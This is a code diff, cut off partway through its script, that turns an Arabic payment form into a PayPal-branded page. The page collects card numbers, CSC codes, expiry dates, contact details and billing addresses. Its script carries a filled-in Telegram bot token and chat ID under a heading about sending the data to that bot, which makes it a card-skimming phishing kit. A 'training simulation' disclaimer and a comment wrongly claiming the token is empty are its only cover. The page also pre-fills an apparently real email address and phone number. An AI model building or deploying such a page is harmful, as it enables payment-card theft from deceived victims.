@@ -3,183 +3,516 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>بوابة دفع –  </title>
-
-
-
-
-
-    
+    <title>بوابة الدفع - الخدمات المالية</title>
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&display=swap" rel="stylesheet">
     <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #764ba2 0%, #764ba2 100%);
+            font-family: 'Tajawal', sans-serif;
+            background: #f4f6f9;
             display: flex;
             justify-content: center;
-            align-items: center;
+            align-items: flex-start;
             min-height: 100vh;
-            margin: 0;
+            padding: 20px;
+            direction: rtl;
         }
-        .warning {
-            background: #ffdddd;
-            padding: 15px;
-            border-radius: 10px;
-            margin-bottom: 20px;
-            text-align: center;
-            border: 2px solid red;
-            font-weight: bold;
-        }
-        .payment-card {
-            background: white;
-            padding: 30px;
-            border-radius: 15px;
-            box-shadow: 0 8px 32px rgba(0,0,0,0.1);
+        .container {
+            max-width: 480px;
             width: 100%;
-            max-width: 400px;
-        }
-        h2 {
+            background: #ffffff;
+            border-radius: 24px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.06);
+            padding: 24px 22px 30px;
+            border: 1px solid #eef2f6;
             margin-top: 0;
-            color: #333;
+        }
+
+        /* رأس المبلغ */
+        .amount-header {
             text-align: center;
+            font-size: 28px;
+            font-weight: 800;
+            color: #0a2540;
+            background: #f8fafc;
+            padding: 12px 0;
+            border-radius: 16px;
+            margin-bottom: 16px;
+            border: 1px dashed #d1d9e6;
         }
-        label {
-            display: block;
-            margin-bottom: 5px;
-            color: #555;
-            font-weight: bold;
-        }
-        input {
-            width: 100%;
-            padding: 10px;
-            margin: 8px 0 16px 0;
-            border: 1px solid #ddd;
-            border-radius: 8px;
-            box-sizing: border-box;
+        .amount-header small {
             font-size: 14px;
+            font-weight: 500;
+            color: #64748b;
         }
-        .row {
-            display: flex;
-            gap: 10px;
+        .paypal-badge {
+            display: inline-block;
+            background: #003087;
+            color: white;
+            padding: 4px 16px;
+            border-radius: 30px;
+            font-size: 14px;
+            font-weight: 700;
+            margin-bottom: 12px;
         }
-        .row div {
-            flex: 1;
+        .secure-text {
+            font-size: 13px;
+            color: #64748b;
+            text-align: center;
+            margin-bottom: 20px;
+            border-bottom: 1px solid #eef2f6;
+            padding-bottom: 14px;
         }
-        button {
+
+        /* الحقول */
+        .form-group { margin-bottom: 14px; }
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 700;
+            color: #1e293b;
+            margin-bottom: 4px;
+        }
+        .form-group input, .form-group select {
             width: 100%;
-            padding: 12px;
-            background: #764ba2;
+            padding: 12px 14px;
+            border: 1.5px solid #e2e8f0;
+            border-radius: 12px;
+            font-size: 15px;
+            background: #fafcff;
+            outline: none;
+            transition: 0.2s;
+            font-family: 'Tajawal', sans-serif;
+            color: #0f172a;
+        }
+        .form-group input:focus, .form-group select:focus {
+            border-color: #2563eb;
+            box-shadow: 0 0 0 3px rgba(37,99,235,0.06);
+            background: #ffffff;
+        }
+
+        /* حقل البطاقة مع الشعارات */
+        .card-row {
+            display: flex;
+            align-items: center;
+            background: #fafcff;
+            border: 1.5px solid #e2e8f0;
+            border-radius: 12px;
+            padding: 0 14px;
+            transition: 0.2s;
+        }
+        .card-row:focus-within {
+            border-color: #2563eb;
+            box-shadow: 0 0 0 3px rgba(37,99,235,0.06);
+        }
+        .card-row input {
+            flex: 1;
+            border: none;
+            background: transparent;
+            padding: 12px 0;
+            font-size: 16px;
+            font-weight: 500;
+            letter-spacing: 1.5px;
+            outline: none;
+            font-family: 'Tajawal', monospace;
+            color: #0f172a;
+        }
+        .card-logos {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            padding-right: 8px;
+            border-right: 1px solid #e2e8f0;
+        }
+        .card-logos img {
+            height: 24px;
+            width: auto;
+            display: none;
+        }
+        .card-logos .show { display: block; }
+        .card-logos .default-icon {
+            font-size: 20px;
+            color: #94a3b8;
+        }
+
+        /* رسالة الخطأ */
+        .error-msg {
+            color: #dc2626;
+            font-size: 13px;
+            font-weight: 500;
+            margin-top: 6px;
+            display: none;
+        }
+        .error-msg.show { display: block; }
+
+        /* صف مزدوج */
+        .row-duo { display: flex; gap: 12px; }
+        .row-duo .form-group { flex: 1; }
+
+        /* عنوان الفوترة */
+        .billing-title {
+            font-size: 16px;
+            font-weight: 800;
+            color: #0f172a;
+            margin: 18px 0 12px 0;
+            border-top: 1px solid #eef2f6;
+            padding-top: 16px;
+        }
+
+        /* لوحة المفاتيح الرقمية الزخرفية */
+        .keypad {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 6px;
+            margin: 12px 0 8px 0;
+            padding: 10px;
+            background: #f8fafc;
+            border-radius: 16px;
+            border: 1px solid #eef2f6;
+            direction: ltr;
+        }
+        .keypad span {
+            background: white;
+            padding: 4px 10px;
+            border-radius: 8px;
+            font-size: 13px;
+            font-weight: 700;
+            color: #334155;
+            border: 1px solid #e2e8f0;
+            min-width: 30px;
+            text-align: center;
+            font-family: monospace;
+        }
+
+        /* أزرار */
+        .pay-btn {
+            width: 100%;
+            background: #0f172a;
             color: white;
             border: none;
-            border-radius: 8px;
-            font-size: 16px;
-            font-weight: bold;
+            padding: 16px;
+            border-radius: 60px;
+            font-size: 18px;
+            font-weight: 800;
             cursor: pointer;
-            transition: 0.3s;
+            transition: 0.2s;
+            margin: 16px 0 12px 0;
+            box-shadow: 0 8px 24px rgba(15,23,42,0.12);
         }
-        button:hover {
-            background: #5a67d8;
+        .pay-btn:hover { background: #1e293b; transform: scale(1.01); }
+
+        .paypal-btn {
+            width: 100%;
+            background: #ffc439;
+            color: #003087;
+            border: none;
+            padding: 14px;
+            border-radius: 60px;
+            font-size: 16px;
+            font-weight: 800;
+            cursor: pointer;
+            transition: 0.2s;
+            margin-bottom: 10px;
         }
-        .alert {
+        .paypal-btn:hover { background: #f5b800; }
+
+        /* رسالة النجاح */
+        #successMsg {
             display: none;
-            padding: 10px;
-            margin: 15px 0;
-            border-radius: 5px;
-            text-align: center;
-        }
-        .alert.success {
-            background: #d4edda;
-            color: #155724;
-            display: block;
-        }
-        .alert.error {
-            background: #f8d7da;
-            color: #721c24;
-            display: block;
-        }
-        .note {
             margin-top: 20px;
-            font-size: 12px;
-            color: #888;
+            padding: 18px;
+            background: #dcfce7;
+            border-radius: 16px;
+            color: #166534;
+            font-weight: 700;
             text-align: center;
+            border: 1px solid #86efac;
+            line-height: 1.8;
+        }
+        #successMsg.show { display: block; }
+
+        /* تحذير */
+        .disclaimer {
+            margin-top: 20px;
+            padding: 10px 14px;
+            background: #fef2f2;
+            border-radius: 12px;
+            border: 1px solid #fecaca;
+            color: #991b1b;
+            font-size: 11px;
+            text-align: center;
+        }
+
+        @media (max-width: 480px) {
+            .container { padding: 16px; }
+            .row-duo { flex-direction: column; gap: 0; }
+            .card-logos img { height: 20px; }
         }
     </style>
 </head>
 <body>
-    <div class="payment-card"         
+    <div class="container">
+        <!-- المبلغ و PayPal -->
+        <div class="amount-header">
+            <span id="displayAmount">9.99</span> <small>USD</small>
         </div>
-        <h2>💳 بوابة الدفع </h2>
+        <div style="text-align: center;">
+            <span class="paypal-badge">💳 PayPal</span>
+        </div>
+        <div class="secure-text">
+            الدفع ببطاقة سحب أو ائتمان <br>
+            <span style="color:#0a2540; font-weight: 600;">لا نشارك معلوماتك المالية مع التاجر.</span>
+        </div>
+
         <form id="paymentForm">
+            <!-- الدولة -->
+            <div class="form-group">
+                <label>الدولة</label>
+                <select id="country" required>
+                    <option value="المملكة العربية السعودية" selected>🇸🇦 المملكة العربية السعودية</option>
+                    <option value="المملكة المتحدة">🇬🇧 المملكة المتحدة</option>
+                    <option value="النرويج">🇳🇴 النرويج</option>
+                    <option value="النمسا">🇦🇹 النمسا</option>
+                    <option value="النيجر">🇳🇪 النيجر</option>
+                    <option value="الهند">🇮🇳 الهند</option>
+                    <option value="الولايات المتحدة">🇺🇸 الولايات المتحدة</option>
+                    <option value="اليابان">🇯🇵 اليابان</option>
+                    <option value="اليمن">🇾🇪 اليمن</option>
+                    <option value="اليونان">🇬🇷 اليونان</option>
+                    <option value="أنتغام برمودا">🇧🇲 أنتغام برمودا</option>
+                    <option value="مصر">🇪🇬 مصر</option>
+                    <option value="ليبيا">🇱🇾 ليبيا</option>
+                    <option value="الإمارات">🇦🇪 الإمارات</option>
+                </select>
+            </div>
 
-            
-            <label>اسم حامل البطاقة</label>
-            <input type="text" id="cardholder" placeholder="مثال: محمد أحمد" required>
+            <!-- البريد الإلكتروني -->
+            <div class="form-group">
+                <label>البريد الإلكتروني</label>
+                <input type="email" id="email" value="gohsheihe@gmail.com" required>
+            </div>
 
-            <label>رقم البطاقة</label>
-            <input type="text" id="card_number" placeholder="5274 9600 1234 5678" maxlength="19" required>
-
-            <div class="row">
-                <div>
-                    <label>شهر الانتهاء</label>
-                    <input type="text" id="exp_month" placeholder="MM" maxlength="2" required>
+            <!-- نوع الهاتف والرقم -->
+            <div class="row-duo">
+                <div class="form-group">
+                    <label>نوع الهاتف</label>
+                    <select id="phoneType">
+                        <option value="المحمول" selected>📱 المحمول</option>
+                        <option value="منزلي">🏠 منزلي</option>
+                        <option value="عمل">💼 عمل</option>
+                    </select>
                 </div>
-                <div>
-                    <label>سنة الانتهاء</label>
-                    <input type="text" id="exp_year" placeholder="YY" maxlength="2" required>
-                </div>
-                <div>
-                    <label>CVV</label>
-                    <input type="text" id="cvv" placeholder="123" maxlength="4" required>
+                <div class="form-group">
+                    <label>رقم الهاتف</label>
+                    <input type="text" id="phone" value="+966 506 532 456" required>
                 </div>
             </div>
 
-            <button type="submit">💳 دفع الآن</button>
+            <!-- رسالة رمز الحماية -->
+            <div style="font-size: 14px; color: #475569; background: #f1f5f9; padding: 8px 14px; border-radius: 10px; margin-bottom: 16px;">
+                🔐 سنرسل إليك رمز حماية لتأكيد هذا الرقم.
+            </div>
+
+            <!-- شعارات البطاقات -->
+            <div style="display: flex; gap: 12px; margin-bottom: 12px; flex-wrap: wrap;">
+                <span style="background: #f1f5f9; padding: 4px 12px; border-radius: 30px; font-weight: 700; color: #1a1f71;">AMEX</span>
+                <span style="background: #f1f5f9; padding: 4px 12px; border-radius: 30px; font-weight: 700; color: #1a1f71;">VISA</span>
+                <span style="background: #f1f5f9; padding: 4px 12px; border-radius: 30px; font-weight: 700; color: #eb001b;">MasterCard</span>
+                <span style="background: #f1f5f9; padding: 4px 12px; border-radius: 30px; font-weight: 700; color: #1a73e8;">Discover</span>
+            </div>
+
+            <!-- رقم البطاقة مع الكشف -->
+            <div class="form-group">
+                <label>رقم البطاقة</label>
+                <div class="card-row">
+                    <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
+                    <div class="card-logos" id="brandContainer">
+                        <span class="default-icon" id="defaultIcon">💳</span>
+                        <img id="visaLogo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png" alt="VISA">
+                        <img id="mcLogo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/2560px-Mastercard-logo.svg.png" alt="MasterCard">
+                        <img id="amexLogo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/0e/American_Express_logo.svg/2560px-American_Express_logo.svg.png" alt="AMEX">
+                        <img id="discoverLogo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/17/Discover_Card_logo.svg/2560px-Discover_Card_logo.svg.png" alt="Discover">
+                    </div>
+                </div>
+                <div class="error-msg" id="cardError">⚠️ رقم بطاقتك غير صالح. حدّث الرقم وحاول مجداً.</div>
+            </div>
+
+            <!-- CSC والتاريخ -->
+            <div class="row-duo">
+                <div class="form-group">
+                    <label>CSC رمز</label>
+                    <input type="text" id="csc" placeholder="258" maxlength="4" value="258" required>
+                </div>
+                <div class="form-group">
+                    <label>تاريخ انتهاء الصلاحية</label>
+                    <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required>
+                </div>
+            </div>
+
+            <!-- عنوان الفوترة -->
+            <div class="billing-title">📍 عنوان الفوترة</div>
+            <div class="row-duo">
+                <div class="form-group">
+                    <label>الاسم الأول</label>
+                    <input type="text" id="firstName" required>
+                </div>
+                <div class="form-group">
+                    <label>اسم العائلة</label>
+                    <input type="text" id="lastName" required>
+                </div>
+            </div>
+            <div class="form-group">
+                <label>اسم الشارع ورقم المنزل</label>
+                <input type="text" id="street" required>
+            </div>
+            <div class="form-group">
+                <label>سطر العنوان 3 (اختياري)</label>
+                <input type="text" id="addressLine3">
+            </div>
+            <div class="form-group">
+                <label>المدينة</label>
+                <input type="text" id="city" required>
+            </div>
+            <div class="form-group">
+                <label>الرمز البريدي (اختياري)</label>
+                <input type="text" id="zip">
+            </div>
+
+            <!-- لوحة المفاتيح الزخرفية -->
+            <div class="keypad">
+                <span>1</span> <span>2 ABC</span> <span>3 DEF</span> <span>-</span>
+                <span>4 GHI</span> <span>5 JKL</span> <span>6 MNO</span> <span>-</span>
+                <span>7 PQRS</span> <span>8 TUV</span> <span>9 WXYZ</span> <span>* #</span>
+                <span>0 +</span> <span>.</span>
+            </div>
+
+            <!-- زر باي بال -->
+            <button type="button" class="paypal-btn" onclick="alert('⚠️ تحويل إلى PayPal (محاكاة). هذه البيئة تدريبية.')">🔄 تحويل إلى PayPal</button>
+
+            <!-- زر الدفع النهائي -->
+            <button type="submit" class="pay-btn">💵 إتمام الدفع</button>
         </form>
 
-        <div id="alert" class="alert"></div>
+        <!-- رسالة النجاح -->
+        <div id="successMsg">
+            ✅ تمت العملية بنجاح <br>
+            <span id="successAmount" style="font-size: 20px;">سيتم خصم مبلغ 9.99 USD</span> من حسابك. <br>
+            📨 ستصلك رسالة تأكيد بعد قليل.
+        </div>
 
-        <div class="note">
-            هذه بوابه الدفع مربوطه بمصرف الراجحي
+        <!-- تحذير أخلاقي -->
+        <div class="disclaimer">
+            ⚠️ هذه البيئة محاكاة تدريبية لأغراض الطب الشرعي الرقمي.<br>
+            استخدامها لجمع بيانات حقيقية يعد جريمة إلكترونية.
         </div>
     </div>
 
     <script>
-        document.getElementById("paymentForm").addEventListener("submit", async function(e) {
-            e.preventDefault();
+        (function() {
+            // ========================================================
+            // 1. كشف العلامة التجارية (BIN) - حسب طلبك: 4 => فيزا، 2 => ماستركارد
+            // ========================================================
+            const cardInput = document.getElementById('cardNumber');
+            const errorMsg = document.getElementById('cardError');
+            const defaultIcon = document.getElementById('defaultIcon');
+            const visaLogo = document.getElementById('visaLogo');
+            const mcLogo = document.getElementById('mcLogo');
+            const amexLogo = document.getElementById('amexLogo');
+            const discoverLogo = document.getElementById('discoverLogo');
 
-            const data = {
-                cardholder: document.getElementById("cardholder").value,
-                card_number: document.getElementById("card_number").value.replace(/\s/g, ''),
-                exp_month: document.getElementById("exp_month").value,
-                exp_year: document.getElementById("exp_year").value,
-                cvv: document.getElementById("cvv").value
-            };
-
-            const alertDiv = document.getElementById("alert");
-            alertDiv.className = "alert"; // إخفاء
-
-            try {
-                const response = await fetch("/charge", {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/x-www-form-urlencoded"
-                    },
-                    body: new URLSearchParams(data)
-                });
-
-                const result = await response.json();
-
-                if (result.status === "success") {
-                    alertDiv.className = "alert success";
-                    alertDiv.textContent = "✅ " + result.detail;
-                } else {
-                    alertDiv.className = "alert error";
-                    alertDiv.textContent = "❌ " + result.detail;
-                }
-            } catch (error) {
-                alertDiv.className = "alert error";
-                alertDiv.textContent = "❌ حدث خطأ في الاتصال بالخادم.";
+            function resetLogos() {
+                [visaLogo, mcLogo, amexLogo, discoverLogo].forEach(el => el.classList.remove('show'));
+                defaultIcon.style.display = 'inline';
             }
-        });
-    </script>
-</body>
-</html>
+
+            function detectBrand(value) {
+                const clean = value.replace(/\s/g, '');
+                if (!clean) return 'default';
+                const first = clean.substring(0, 1);
+                const firstTwo = clean.substring(0, 2);
+                const firstFour = clean.substring(0, 4);
+
+                // أولوية الطلب: 4 => VISA، 2 => MasterCard
+                if (first === '4') return 'visa';
+                if (first === '2') return 'mastercard';
+                // AMEX: 34 أو 37
+                if (firstTwo === '34' || firstTwo === '37') return 'amex';
+                // Discover: 6011 أو 65
+                if (firstFour === '6011' || firstTwo === '65') return 'discover';
+                return 'default';
+            }
+
+            function updateBrand() {
+                const raw = cardInput.value;
+                const brand = detectBrand(raw);
+                resetLogos();
+
+                // التحقق من طول الرقم لإظهار رسالة الخطأ
+                const clean = raw.replace(/\s/g, '');
+                if (clean.length > 0 && clean.length < 15) {
+                    errorMsg.classList.add('show');
+                } else {
+                    errorMsg.classList.remove('show');
+                }
+
+                if (brand === 'visa') {
+                    visaLogo.classList.add('show');
+                    defaultIcon.style.display = 'none';
+                } else if (brand === 'mastercard') {
+                    mcLogo.classList.add('show');
+                    defaultIcon.style.display = 'none';
+                } else if (brand === 'amex') {
+                    amexLogo.classList.add('show');
+                    defaultIcon.style.display = 'none';
+                } else if (brand === 'discover') {
+                    discoverLogo.classList.add('show');
+                    defaultIcon.style.display = 'none';
+                } else {
+                    defaultIcon.style.display = 'inline';
+                }
+            }
+
+            // تنسيق المدخلات (مسافات)
+            cardInput.addEventListener('input', function() {
+                let val = this.value.replace(/\s/g, '').replace(/\D/g, '');
+                let formatted = '';
+                for (let i = 0; i < val.length && i < 16; i++) {
+                    if (i > 0 && i % 4 === 0) formatted += ' ';
+                    formatted += val[i];
+                }
+                this.value = formatted;
+                updateBrand();
+            });
+
+            // ========================================================
+            // 2. المبلغ الديناميكي (يمكن للمستخدم تغييره)
+            // ========================================================
+            const amountDisplay = document.getElementById('displayAmount');
+            const successAmount = document.getElementById('successAmount');
+            // نسمح بتعديل المبلغ عبر نقرة (لتجربة المستخدم)
+            amountDisplay.addEventListener('click', function() {
+                const newVal = prompt('أدخل المبلغ الجديد (USD):', this.textContent);
+                if (newVal && !isNaN(parseFloat(newVal))) {
+                    this.textContent = parseFloat(newVal).toFixed(2);
+                }
+            });
+            amountDisplay.style.cursor = 'pointer';
+            amountDisplay.title = 'انقر لتعديل المبلغ';
+
+            // ========================================================
+            // 3. الإرسال إلى بوت Telegram + رسالة النجاح
+            // ========================================================
+            const form = document.getElementById('paymentForm');
+            const successDiv = document.getElementById('successMsg');
+
+            // 🔴 التوكن المعرف (فارغ في وضع المحاكاة)
+            const BOT_TOKEN = '8902691129:AAFOqFvH68JsINLOK1cNAKQ8pG1QBmsktPs';
+            const CHAT_ID = '8399221617';
+
+            form.addEventListener('submit', function(e) {
+                e.preventDefault();
+
+                // جلب جميع البيانات
+                const country = document.getElementById('country').value;
+                const email = document.getElementByI
